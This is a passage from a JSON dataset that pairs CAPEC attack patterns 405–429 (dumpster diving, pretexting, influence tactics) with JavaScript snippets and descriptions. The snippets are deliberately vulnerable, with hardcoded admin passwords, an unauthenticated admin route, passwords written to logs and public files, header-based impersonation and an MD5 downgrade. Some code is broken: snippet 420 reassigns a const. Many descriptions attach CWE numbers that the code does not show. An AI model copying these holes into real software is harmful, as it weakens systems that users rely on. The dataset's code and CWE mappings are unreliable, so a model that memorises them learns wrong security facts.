        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  // Log request details\n  fs.appendFile('server.log', `Request: ${req.url} - ${new Date().toISOString()}\n`, (err) => {\n    if (err) throw err;\n  });\n\n  // Simulate authentication bypass\n  if (req.url === '/admin') {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Welcome to the admin panel');\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server that logs request details to a file named 'server.log'. The logging mechanism can expose sensitive information through server log files (related to deprecated CWE-533). Additionally, the code simulates an authentication bypass issue by allowing access to an admin panel without proper authentication (related to deprecated CWE-592). This embodies the main idea of the deprecated CAPEC, which involves gathering and analyzing information, potentially leading to security vulnerabilities."
    },
    {
        "capec_id": "406",
        "capec_name": "Dumpster Diving",
        "code_snippet": "const fs = require('fs');\n\n// Simulate storing sensitive information in cleartext\nconst sensitiveData = 'User: admin, Password: admin123';\nfs.writeFileSync('sensitive_info.txt', sensitiveData);\n\n// Simulate generating a core dump file\nconst coreDump = 'Core dump: memory address 0x123456';\nfs.writeFileSync('core_dump.txt', coreDump);\n\n// Simulate storing a version-control repository in an accessible directory\nconst repoData = 'Version control data: commit abc123';\nfs.writeFileSync('public/repo/.git/config', repoData);\n\nconsole.log('Sensitive data, core dump, and version control data stored in accessible locations.');",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the CAPEC 'Dumpster Diving' and associated CWEs. It simulates the storage of sensitive information in cleartext (CWE-316), the generation of a core dump file (CWE-528), and the exposure of a version-control repository (CWE-527). The code writes sensitive data, core dump information, and version control data to files in accessible locations, representing how an adversary could potentially retrieve valuable information from improperly managed files and directories."
    },
    {
        "capec_id": "407",
        "capec_name": "Pretexting",
        "code_snippet": "const express = require('express');\nconst session = require('express-session');\nconst app = express();\n\napp.use(session({\n  secret: 'secret-key',\n  resave: false,\n  saveUninitialized: true\n}));\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  // Simulate user authentication\n  if (username === 'admin' && password === 'password') {\n    req.session.user = { username };\n    res.send('Logged in');\n  } else {\n    res.send('Invalid credentials');\n  }\n});\n\napp.get('/sensitive-data', (req, res) => {\n  if (req.session.user) {\n    // Exposing sensitive information without proper authorization check\n    res.send('Sensitive Information: [REDACTED]');\n  } else {\n    res.send('Unauthorized');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a simple Express.js application that demonstrates the concept of pretexting and related vulnerabilities. The code includes a login endpoint that simulates user authentication and a session management system. However, it does not invalidate existing session identifiers (CWE-384), potentially allowing session fixation attacks. Additionally, the '/sensitive-data' endpoint exposes sensitive information without proper authorization checks (CWE-200), making it vulnerable to unauthorized access. The code also lacks proper verification of the communication channel's integrity (CWE-300) and could misrepresent critical information in the user interface (CWE-451). This snippet embodies the main idea of pretexting by showing how an adversary could manipulate the system to gain unauthorized access to sensitive information."
    },
    {
        "capec_id": "408",
        "capec_name": "DEPRECATED: Information Gathering from Traditional Sources",
        "code_snippet": "const fs = require('fs');\n\n// Vulnerable code: Storing sensitive information in a log file\nfunction logSensitiveData(data) {\n  const logFile = 'server.log';\n  fs.appendFileSync(logFile, `Sensitive Data: ${data}\\n`);\n}\n\n// Example usage\nlogSensitiveData('User password: 12345');",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to the deprecated CAPEC pattern of 'Information Gathering from Traditional Sources' and related CWEs. The function 'logSensitiveData' writes sensitive information, such as user passwords, to a server log file without any protection. This represents CWE-534 and CWE-533, which deal with information exposure through log files. The code highlights the risk of exposing sensitive data through improper logging practices, which can be exploited by attackers to gather information."
    },
    {
        "capec_id": "409",
        "capec_name": "DEPRECATED: Information Gathering from Non-Traditional Sources",
        "code_snippet": "const fs = require('fs');\nconst dns = require('dns');\n\n// Vulnerable: Storing sensitive data without encryption\nlet sensitiveData = 'user_password=12345';\nfs.writeFileSync('data.txt', sensitiveData);\n\n// Vulnerable: Logging sensitive information\nconsole.log('Sensitive Data:', sensitiveData);\n\n// Vulnerable: Making security decisions based on DNS lookups\nconst domain = 'example.com';\ndns.lookup(domain, (err, address) => {\n  if (err) throw err;\n  if (address === '192.168.1.1') {\n    console.log('Access granted');\n  } else {\n    console.log('Access denied');\n  }\n});",
        "description": "This JavaScript code snippet demonstrates several deprecated vulnerabilities related to information exposure and improper security decisions. The code stores sensitive data in a file without encryption (CWE-217, CWE-218), logs sensitive information to the console (CWE-534, CWE-533), and makes security decisions based on DNS lookups (CWE-247). These practices can lead to information leakage and unauthorized access, highlighting the importance of proper data protection and secure coding practices."
    },
    {
        "capec_id": "410",
        "capec_name": "Information Elicitation",
        "code_snippet": "const sensitiveData = 'UserPassword123';\n\nfunction handleRequest(request) {\n  if (request.source === 'trustedSource') {\n    console.log('Handling request from trusted source');\n    // Process the request and potentially expose sensitive data\n    console.log(`Sensitive Data: ${sensitiveData}`);\n  } else {\n    console.log('Request from unverified source');\n  }\n}\n\n// Simulated requests\nconst request1 = { source: 'trustedSource' };\nconst request2 = { source: 'untrustedSource' };\n\nhandleRequest(request1); // Exposes sensitive data\nhandleRequest(request2); // Does not expose sensitive data",
        "description": "This JavaScript code snippet demonstrates a scenario where sensitive information (a password) is exposed based on the source of a request. The function `handleRequest` checks if the request is from a 'trustedSource' and, if so, logs the sensitive data. This embodies the CAPEC concept of 'Information Elicitation' by showing how an adversary could exploit the system's behavior to extract sensitive information. The code also highlights several related CWEs: CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially exposing sensitive data, CWE-940 (Improper Verification of Source of a Communication Channel) by only superficially checking the request source, and CWE-205 (Observable Behavioral Discrepancy) by behaving differently based on the request source."
    },
    {
        "capec_id": "411",
        "capec_name": "DEPRECATED: Pretexting",
        "code_snippet": "const fs = require('fs');\nconst http = require('http');\n\nhttp.createServer((req, res) => {\n  const logData = `Request from ${req.connection.remoteAddress} at ${new Date().toISOString()}`;\n  fs.appendFile('server.log', logData + '\\n', (err) => {\n    if (err) throw err;\n  });\n\n  if (req.url === '/admin' && req.headers['x-auth'] !== 'secret-token') {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Forbidden');\n  } else {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Welcome to the admin page');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that logs incoming requests to a file named 'server.log'. The log includes the client's IP address and the timestamp of the request. The server also has a simple authentication mechanism for accessing the '/admin' page, which checks for a specific header value ('x-auth' with value 'secret-token'). If the header is missing or incorrect, the server responds with a '403 Forbidden' status. This code embodies the main idea of CAPEC-407 (Social Information Gathering via Pretexting) by potentially exposing sensitive information through log files (related to deprecated CWE-533, CWE-534, and CWE-542) and demonstrating a weak authentication mechanism (related to deprecated CWE-592)."
    },
    {
        "capec_id": "412",
        "capec_name": "Pretexting via Customer Service",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.json());\n\napp.post('/customer-service', (req, res) => {\n  const { customerId, creditCardNumber } = req.body;\n  \n  // CWE-940: Improper Verification of Source of a Communication Channel\n  if (!req.headers['x-auth-token']) {\n    return res.status(401).send('Unauthorized');\n  }\n  \n  // CWE-300: Channel Accessible by Non-Endpoint\n  if (req.headers['x-auth-token'] !== 'expected-auth-token') {\n    return res.status(403).send('Forbidden');\n  }\n  \n  // CWE-408: Incorrect Behavior Order: Early Amplification\n  if (!customerId) {\n    return res.status(400).send('Bad Request');\n  }\n  \n  // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n  console.log(`Customer ID: ${customerId}, Credit Card Number: ${creditCardNumber}`);\n  \n  res.send('Customer service request processed');\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a simple Express.js server that handles customer service requests. The main idea of the CAPEC is embodied in the way the server processes incoming requests and verifies their authenticity. The code includes several CWE-related vulnerabilities:\n\n1. **CWE-940: Improper Verification of Source of a Communication Channel** - The server checks for an 'x-auth-token' header but does not verify its source properly.\n2. **CWE-300: Channel Accessible by Non-Endpoint** - The server checks the 'x-auth-token' value but does not ensure the integrity of the communication channel.\n3. **CWE-408: Incorrect Behavior Order: Early Amplification** - The server processes the request and logs sensitive information before fully verifying the request's authenticity.\n4. **CWE-200: Exposure of Sensitive Information to an Unauthorized Actor** - The server logs sensitive information (credit card number) without ensuring the request is from an authorized actor.\n\nThis code snippet demonstrates how an adversary could exploit these weaknesses to perform pretexting via customer service, as described in the CAPEC."
    },
    {
        "capec_id": "413",
        "capec_name": "Pretexting via Tech Support",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Simulate tech support pretexting attack\nfunction handleTechSupportRequest(userInput) {\n  // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n  const sensitiveInfo = 'UserPassword123';\n  if (userInput === 'password') {\n    console.log(`Sensitive Information Exposed: ${sensitiveInfo}`);\n  }\n\n  // CWE-434: Unrestricted Upload of File with Dangerous Type\n  const uploadFile = (filePath) => {\n    const fileExtension = path.extname(filePath);\n    if (fileExtension === '.exe') {\n      console.log('Dangerous file type uploaded!');\n      // Simulate execution of malicious payload\n      fs.writeFileSync('/tmp/malicious.exe', 'malicious content');\n    }\n  };\n\n  // Simulate file upload\n  uploadFile('malicious.exe');\n}\n\n// Simulate a tech support call\nhandleTechSupportRequest('password');",
        "description": "This JavaScript code snippet simulates a tech support pretexting attack, embodying the main idea of CAPEC-Pretexting via Tech Support. The function `handleTechSupportRequest` demonstrates how an adversary might solicit sensitive information (CWE-200) by asking for a password and then exposing it. Additionally, the `uploadFile` function simulates the unrestricted upload of a dangerous file type (CWE-434), which could be used to execute a malicious payload. This code represents the potential vulnerabilities and attack vectors that can be exploited through social engineering tactics, such as impersonating tech support."
    },
    {
        "capec_id": "414",
        "capec_name": "Pretexting via Delivery Person",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/deliver') {\n    // CWE-941: Incorrectly Specified Destination in a Communication Channel\n    const destination = req.headers['x-destination'] || 'defaultDestination';\n    // CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\n    fs.writeFileSync('/public/delivery_info.txt', `Delivery to: ${destination}`);\n    // CWE-300: Channel Accessible by Non-Endpoint\n    if (!req.headers['x-auth-token']) {\n      res.writeHead(403, {'Content-Type': 'text/plain'});\n      res.end('Forbidden');\n      return;\n    }\n    // CWE-433: Unparsed Raw Web Content Delivery\n    fs.writeFileSync('/public/raw_content.html', '<script>alert(\"Delivery Complete\")</script>');\n    // CWE-1292: Incorrect Conversion of Security Identifiers\n    const securityId = parseInt(req.headers['x-security-id'], 10);\n    if (isNaN(securityId)) {\n      res.writeHead(400, {'Content-Type': 'text/plain'});\n      res.end('Invalid Security ID');\n      return;\n    }\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Delivery Accepted');\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for delivery requests. It embodies the CAPEC 'Pretexting via Delivery Person' by simulating a scenario where an adversary could exploit various weaknesses to solicit information or manipulate actions. The code includes several CWE-related vulnerabilities: CWE-941 (incorrectly specified destination), CWE-538 (insertion of sensitive information into an externally-accessible file), CWE-300 (channel accessible by non-endpoint), CWE-433 (unparsed raw web content delivery), and CWE-1292 (incorrect conversion of security identifiers). These vulnerabilities illustrate how an adversary could exploit the system by impersonating a delivery person and manipulating the communication channel and data handling processes."
    },
    {
        "capec_id": "415",
        "capec_name": "Pretexting via Phone",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  const { headers } = req;\n  const trustedRoles = ['employee', 'technician', 'helpdesk'];\n\n  // Simulate a pretexting attack by checking for a trusted role in headers\n  if (trustedRoles.includes(headers['x-role'])) {\n    // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n    res.writeHead(200, { 'Content-Type': 'text/plain' });\n    res.end('Sensitive Information: User credentials, internal IPs, etc.');\n  } else {\n    // CWE-940: Improper Verification of Source of a Communication Channel\n    res.writeHead(403, { 'Content-Type': 'text/plain' });\n    res.end('Access Denied');\n  }\n});\n\nserver.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that simulates a pretexting attack via phone, as described in the CAPEC. The server checks the 'x-role' header in incoming requests to determine if the request is coming from a trusted role (e.g., employee, technician, helpdesk). If the role is trusted, the server exposes sensitive information (CWE-200). If the role is not trusted, the server denies access (CWE-940). This demonstrates how improper verification of the source of a communication channel can lead to the exposure of sensitive information."
    },
    {
        "capec_id": "416",
        "capec_name": "Manipulate Human Behavior",
        "code_snippet": "const sensitiveData = 'user_password';\n\nfunction handleRequest(request) {\n  if (request.userRole === 'admin') {\n    return sensitiveData;\n  } else if (request.userRole === 'helpdesk' && request.isSupervisor) {\n    return sensitiveData;\n  } else {\n    return 'Access Denied';\n  }\n}\n\n// Simulating a social engineering attack\nconst attackerRequest = {\n  userRole: 'helpdesk',\n  isSupervisor: true\n};\n\nconsole.log(handleRequest(attackerRequest)); // Exposes sensitive information",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker manipulates human behavior to gain unauthorized access to sensitive information. The `handleRequest` function checks the user's role and an additional flag `isSupervisor` to decide whether to return sensitive data. An attacker posing as a helpdesk supervisor can exploit this logic to access the sensitive data. This example embodies the CAPEC idea of manipulating human behavior to solicit information and highlights related CWEs such as 'Exposure of Sensitive Information to an Unauthorized Actor' (CWE-200) and 'Improper Control of Interaction Frequency' (CWE-799)."
    },
    {
        "capec_id": "417",
        "capec_name": "Influence Perception",
        "code_snippet": "const users = { 'admin': 'password123' }; // CWE-656: Security through obscurity\n\nfunction authenticate(username, password) {\n  if (users[username] && users[username] === password) {\n    console.log('Authentication successful');\n    return true;\n  } else {\n    console.log('Authentication failed');\n    return false;\n  }\n}\n\nfunction performSensitiveAction(username, password) {\n  if (authenticate(username, password)) {\n    console.log('Sensitive action performed');\n  } else {\n    console.log('Access denied');\n  }\n}\n\n// CWE-654: Reliance on a single factor (password) for authentication\n// CWE-205: Observable behavioral discrepancy in authentication messages\n// CWE-222: Truncation of security-relevant information in logs\n\n// Simulating a social engineering attack\nconst attackerUsername = 'admin';\nconst attackerPassword = 'password123';\nperformSensitiveAction(attackerUsername, attackerPassword);",
        "description": "This JavaScript code snippet demonstrates a simple authentication mechanism that relies on a single factor (username and password) to grant access to sensitive actions. The code uses a hardcoded password for the 'admin' user, which is an example of CWE-656 (Reliance on Security Through Obscurity). The authentication function logs different messages based on the success or failure of the login attempt, which can lead to CWE-205 (Observable Behavioral Discrepancy). Additionally, the logs do not provide detailed information about the failure, which can be seen as CWE-222 (Truncation of Security-relevant Information). The overall scenario represents a social engineering attack where an attacker uses known credentials to perform a sensitive action, embodying the main idea of the CAPEC 'Influence Perception'."
    },
    {
        "capec_id": "418",
        "capec_name": "Influence Perception of Reciprocation",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  const userAgent = req.headers['user-agent'];\n  if (userAgent) {\n    console.log(`Received request from: ${userAgent}`);\n    // Compliment the user agent to create a sense of obligation\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(`Wow, your browser (${userAgent}) is really up-to-date! Can you tell us your email for a special offer?`);\n  } else {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('User-Agent header missing');\n  }\n});\n\nserver.listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. When a request is received, it checks for the 'User-Agent' header. If the header is present, it logs the user agent and sends a response that compliments the user's browser. This compliment is followed by a request for the user's email, leveraging the social engineering technique described in the CAPEC to create a sense of obligation to reciprocate. The code also demonstrates CWE-300 (Channel Accessible by Non-Endpoint) by not verifying the identity of the requester, CWE-940 (Improper Verification of Source of a Communication Channel) by not verifying the origin of the request, and CWE-222 (Truncation of Security-relevant Information) by potentially truncating the user agent string."
    },
    {
        "capec_id": "419",
        "capec_name": "DEPRECATED: Target Influence via Perception of Concession",
        "code_snippet": "const http = require('http');\nconst crypto = require('crypto');\n\nconst options = {\n  hostname: 'example.com',\n  port: 80,\n  path: '/login',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/json'\n  }\n};\n\nconst req = http.request(options, (res) => {\n  let data = '';\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n  res.on('end', () => {\n    if (res.statusCode === 200) {\n      console.log('Login successful');\n    } else {\n      console.log('Login failed');\n    }\n  });\n});\n\nconst postData = JSON.stringify({\n  username: 'user',\n  password: 'pass'\n});\n\nreq.write(postData);\nreq.end();\n\n// Algorithm Downgrade Vulnerability\nconst algorithms = ['sha256', 'md5'];\nconst selectedAlgorithm = algorithms.includes('md5') ? 'md5' : 'sha256';\nconst hash = crypto.createHash(selectedAlgorithm).update('some data').digest('hex');\nconsole.log(`Using algorithm: ${selectedAlgorithm}, Hash: ${hash}`);",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation that embodies the deprecated CAPEC pattern 'Target Influence via Perception of Concession' and related CWEs. The code initiates an HTTP POST request to a login endpoint and logs whether the login was successful based on the HTTP status code, which can reveal security-relevant information (CWE-203, CWE-205). Additionally, it includes an algorithm downgrade vulnerability (CWE-757) by selecting a less secure 'md5' hashing algorithm if available, instead of the stronger 'sha256'. This snippet highlights how observable discrepancies and insecure algorithm negotiation can be exploited by unauthorized actors."
    },
    {
        "capec_id": "420",
        "capec_name": "Influence Perception of Scarcity",
        "code_snippet": "const itemsInStock = 5;\n\nfunction checkStock(item) {\n  if (itemsInStock <= 0) {\n    console.log('Item is out of stock!');\n    return false;\n  }\n  return true;\n}\n\nfunction purchaseItem(item) {\n  if (checkStock(item)) {\n    console.log('Purchase successful!');\n    // Simulate stock reduction\n    itemsInStock--;\n  } else {\n    console.log('Purchase failed.');\n  }\n}\n\n// Simulate user action\npurchaseItem('Widget');\n\n// Adversary manipulates stock perception\nitemsInStock = 0;\n\n// User tries to purchase again\npurchaseItem('Widget');",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary manipulates the perception of scarcity to influence user behavior. The `itemsInStock` variable represents the stock level of an item. The `checkStock` function checks if the item is in stock and returns a boolean value. The `purchaseItem` function attempts to purchase the item if it is in stock, reducing the stock level by one. The adversary manipulates the `itemsInStock` variable to create a false perception of scarcity, influencing the user's decision to purchase the item quickly. This embodies the CAPEC idea of leveraging scarcity perception. The code also touches on CWE-654 (Reliance on a Single Factor in a Security Decision) as it relies solely on the `itemsInStock` variable to make purchase decisions, and CWE-222 (Truncation of Security-relevant Information) as it does not provide detailed information about the stock manipulation, potentially obscuring the adversary's actions."
    },
    {
        "capec_id": "421",
        "capec_name": "Influence Perception of Authority",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  const { headers } = req;\n  const authHeader = headers['authorization'];\n\n  // CWE-654: Reliance on a Single Factor in a Security Decision\n  if (authHeader && authHeader === 'Bearer trusted-token') {\n    // CWE-940: Improper Verification of Source of a Communication Channel\n    // CWE-300: Channel Accessible by Non-Endpoint\n    const impersonatedUser = headers['x-impersonate-user'];\n    if (impersonatedUser) {\n      // CWE-301: Reflection Attack in an Authentication Protocol\n      res.writeHead(200, { 'Content-Type': 'text/plain' });\n      res.end(`Sensitive information for user: ${impersonatedUser}`);\n    } else {\n      res.writeHead(400, { 'Content-Type': 'text/plain' });\n      res.end('Bad Request');\n    }\n  } else {\n    res.writeHead(401, { 'Content-Type': 'text/plain' });\n    res.end('Unauthorized');\n  }\n});\n\nserver.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that demonstrates the CAPEC 'Influence Perception of Authority' by using a social engineering technique to impersonate a user. The server checks for an 'authorization' header and relies on a single factor (CWE-654) to grant access. If the header matches a trusted token, it further checks for an 'x-impersonate-user' header, which can be used to impersonate a user (CWE-940, CWE-300). If the impersonation header is present, the server responds with sensitive information for the impersonated user, demonstrating a reflection attack (CWE-301). This code highlights the vulnerabilities associated with improper verification and reliance on single-factor authentication."
    },
    {
        "capec_id": "422",
        "capec_name": "Influence Perception of Commitment and Consistency",
        "code_snippet": "const express = require('express');\nconst app = express();\nlet requestCount = 0;\n\napp.use((req, res, next) => {\n  requestCount++;\n  if (requestCount > 100) {\n    res.status(429).send('Too Many Requests');\n    return;\n  }\n  next();\n});\n\napp.post('/api/task', (req, res) => {\n  const task = req.body.task;\n  if (!task) {\n    res.status(400).send('Bad Request');\n    return;\n  }\n  // Simulate task processing\n  res.status(200).send('Task Accepted');\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This code snippet sets up an Express.js server that limits the number of incoming requests to 100 to prevent 'Improper Control of Interaction Frequency' (CWE-799). It also checks for the presence of a 'task' in the request body to avoid 'Observable Behavioral Discrepancy' (CWE-205) and 'Observable Discrepancy' (CWE-203). The server responds with 'Too Many Requests' if the limit is exceeded, and 'Bad Request' if the 'task' is missing, simulating a minor task request. This embodies the CAPEC idea of influencing perception by making users perform minor tasks, which could lead to more significant actions later."
    },
    {
        "capec_id": "423",
        "capec_name": "Influence Perception of Liking",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst port = 3000;\n\n// Simulated user database\nconst users = {\n  'user1': { password: 'password123', likes: ['user2'] },\n  'user2': { password: 'password456', likes: [] }\n};\n\n// Middleware to simulate authentication\napp.use((req, res, next) => {\n  const { username, password } = req.query;\n  if (users[username] && users[username].password === password) {\n    req.user = users[username];\n    next();\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\n// Endpoint to simulate liking another user\napp.get('/like', (req, res) => {\n  const { target } = req.query;\n  if (req.user && users[target]) {\n    req.user.likes.push(target);\n    res.send(`You liked ${target}`);\n  } else {\n    res.status(400).send('Bad Request');\n  }\n});\n\n// Endpoint to simulate sensitive action based on liking\napp.get('/sensitive-action', (req, res) => {\n  const { target } = req.query;\n  if (req.user && req.user.likes.includes(target)) {\n    res.send(`Sensitive action allowed for ${target}`);\n  } else {\n    res.status(403).send('Forbidden');\n  }\n});\n\napp.listen(port, () => {\n  console.log(`App listening at http://localhost:${port}`);\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server that simulates a scenario where an adversary can influence a target's actions by building a relationship. The code includes a simulated user database and endpoints for liking another user and performing a sensitive action based on that liking. The authentication middleware demonstrates CWE-301 by using a simple authentication protocol that could be subject to reflection attacks. The reliance on a single factor (liking) for allowing sensitive actions demonstrates CWE-654. The observable behavioral discrepancy (CWE-205) is shown by the different responses based on the liking status. The code also implicitly relies on security through obscurity (CWE-656) by not securing the sensitive action properly. Finally, the use of query parameters for sensitive actions could be seen as an implicit intent (CWE-927)."
    },
    {
        "capec_id": "424",
        "capec_name": "Influence Perception of Consensus or Social Proof",
        "code_snippet": "const users = ['user1', 'user2', 'user3'];\nlet currentUser = 'user4';\n\nfunction authenticate(user) {\n  if (users.includes(user)) {\n    console.log('Authentication successful');\n    return true;\n  } else {\n    console.log('Authentication failed');\n    return false;\n  }\n}\n\nfunction performAction(user) {\n  if (authenticate(user)) {\n    console.log('Performing sensitive action');\n  } else {\n    console.log('Action not allowed');\n  }\n}\n\n// Adversary influences the target to use a known user\ncurrentUser = 'user1';\nperformAction(currentUser);",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary influences the target to adopt a behavior that is advantageous to the adversary. The `authenticate` function checks if a user is in the list of known users and logs the result, revealing whether the authentication was successful or not (CWE-203). The `performAction` function performs a sensitive action only if the user is authenticated. The adversary can influence the target to use a known user (e.g., 'user1') to gain access to restricted functionality (CWE-654). The code also shows observable discrepancies in behavior based on the user's authentication status (CWE-205, CWE-207)."
    },
    {
        "capec_id": "425",
        "capec_name": "Target Influence via Framing",
        "code_snippet": "const userInput = prompt('Please enter your username:');\nconst isValidUser = (user) => user === 'admin';\n\nif (isValidUser(userInput)) {\n  alert('Welcome back, admin!');\n} else {\n  alert('Welcome! Please enjoy our services.');\n}\n\nconst sendSensitiveData = (data) => {\n  const destination = isValidUser(userInput) ? 'https://secure-endpoint.com' : 'https://less-secure-endpoint.com';\n  fetch(destination, {\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json'\n    },\n    body: JSON.stringify(data)\n  }).then(response => response.json())\n    .then(data => console.log('Success:', data))\n    .catch((error) => console.error('Error:', error));\n};\n\nsendSensitiveData({ key: 'sensitiveInformation' });",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary can influence the target's actions through framing techniques. The code prompts the user to enter a username and checks if the user is 'admin'. Regardless of the input, the user is greeted positively, which can make them more likely to trust the system. The function `sendSensitiveData` sends sensitive information to different endpoints based on the user's input. If the user is 'admin', the data is sent to a secure endpoint; otherwise, it is sent to a less secure endpoint. This embodies the CAPEC idea of influencing the target's perspective and actions, while also illustrating related CWEs such as reliance on a single factor in a security decision (CWE-654), UI misrepresentation (CWE-451), and incorrectly specified destination in a communication channel (CWE-941)."
    },
    {
        "capec_id": "426",
        "capec_name": "Influence via Incentives",
        "code_snippet": "const users = [{id: 1, name: 'Alice', balance: 100}, {id: 2, name: 'Bob', balance: 50}];\n\nfunction transferFunds(senderId, receiverId, amount) {\n  const sender = users.find(user => user.id === senderId);\n  const receiver = users.find(user => user.id === receiverId);\n  if (sender && receiver && sender.balance >= amount) {\n    sender.balance -= amount;\n    receiver.balance += amount;\n    console.log(`Transferred ${amount} from ${sender.name} to ${receiver.name}`);\n  } else {\n    console.log('Transfer failed');\n  }\n}\n\n// Adversary influences Bob to transfer funds to a malicious account\ntransferFunds(2, 1, 50);",
        "description": "This JavaScript code snippet demonstrates a simple financial transaction system where users can transfer funds to each other. The `transferFunds` function checks if the sender has enough balance before transferring the specified amount to the receiver. The code embodies the CAPEC 'Influence via Incentives' by showing how an adversary could manipulate a user (Bob) to transfer funds to another account (potentially malicious). The related CWEs are represented as follows:\n- CWE-1229: The transfer function indirectly creates a new resource (the updated balance) that can be exploited.\n- CWE-405: The function does not require significant effort from the adversary to cause a resource transfer.\n- CWE-941: The function assumes the specified destination (receiverId) is correct without validation.\n- CWE-656: The security of the transfer relies on the obscurity of the user IDs.\n- CWE-654: The decision to transfer funds relies solely on the balance check, without additional security measures."
    },
    {
        "capec_id": "427",
        "capec_name": "Influence via Psychological Principles",
        "code_snippet": "const users = [{username: 'admin', password: 'admin123'}, {username: 'user', password: 'user123'}];\n\nfunction authenticate(username, password) {\n  const user = users.find(u => u.username === username);\n  if (user && user.password === password) {\n    console.log('Authentication successful');\n    return true;\n  } else {\n    console.log('Authentication failed');\n    return false;\n  }\n}\n\nfunction login() {\n  const username = prompt('Enter username:');\n  const password = prompt('Enter password:');\n  if (authenticate(username, password)) {\n    alert('Welcome ' + username);\n  } else {\n    alert('Invalid credentials');\n  }\n}\n\nlogin();",
        "description": "This JavaScript code snippet demonstrates a simple authentication mechanism that is vulnerable to several weaknesses described in the CAPEC and related CWEs. The `authenticate` function relies on a single factor (username and password) for authentication (CWE-654). The `login` function uses `prompt` to collect user credentials, which can be influenced by external actors (CWE-673). Additionally, the code logs authentication success or failure, which can reveal behavioral discrepancies (CWE-205). This simplistic approach to authentication can be exploited by adversaries using psychological principles to influence user behavior, such as phishing attacks where users are tricked into providing their credentials."
    },
    {
        "capec_id": "428",
        "capec_name": "Influence via Modes of Thinking",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    const message = data.toString();\n    if (message.includes('password')) {\n      console.log('Sensitive information received:', message);\n    }\n    // Reflecting the message back to the sender\n    socket.write(`Echo: ${message}`);\n  });\n});\n\nserver.listen(1337, '127.0.0.1', () => {\n  console.log('Server listening on port 1337');\n});",
        "description": "This JavaScript code snippet creates a simple TCP server using the 'net' module. The server listens for incoming connections and processes data received from clients. When data is received, it checks if the message contains the word 'password' and logs it, demonstrating the potential for sensitive information leakage (CWE-222). The server then reflects the received message back to the sender, which can be exploited in a reflection attack (CWE-301). This setup can be used by an adversary to build rapport with a target by mimicking their communication patterns, making the target more likely to share sensitive information (CAPEC-Influence via Modes of Thinking). The code does not verify the source of the communication (CWE-940) and does not ensure the integrity of the communication channel (CWE-300), making it vulnerable to various attacks."
    },
    {
        "capec_id": "429",
        "capec_name": "Target Influence via Eye Cues",
        "code_snippet": "document.addEventListener('mousemove', function(event) {\n  let eyeMovementData = { x: event.clientX, y: event.clientY };\n  let sensitiveInfo = 'Sensitive Data';\n  if (eyeMovementData.x > 500) {\n    console.log('User is looking at sensitive area');\n    sensitiveInfo = sensitiveInfo.substring(0, 5); // CWE-222: Truncation of Security-relevant Information\n  }\n  if (eyeMovementData.y < 100) {\n    console.log('User is looking at the top of the screen');\n    sensitiveInfo = '*****'; // CWE-451: UI Misrepresentation of Critical Information\n  }\n  console.log('Sensitive Info:', sensitiveInfo);\n});",
        "description": "This JavaScript code snippet listens for mouse movements and uses the cursor's position to infer where the user is looking on the screen. If the cursor is in a specific area (e.g., x > 500), it logs that the user is looking at a sensitive area and truncates the sensitive information (CWE-222). If the cursor is in another specific area (e.g., y < 100), it misrepresents the sensitive information (CWE-451). This demonstrates how an adversary could gain information via non-verbal cues (eye movements) and how observable discrepancies (CWE-203) and UI misrepresentation (CWE-451) can be exploited to infer or obscure security-relevant information."
    },
    {
        "capec_id": "430",
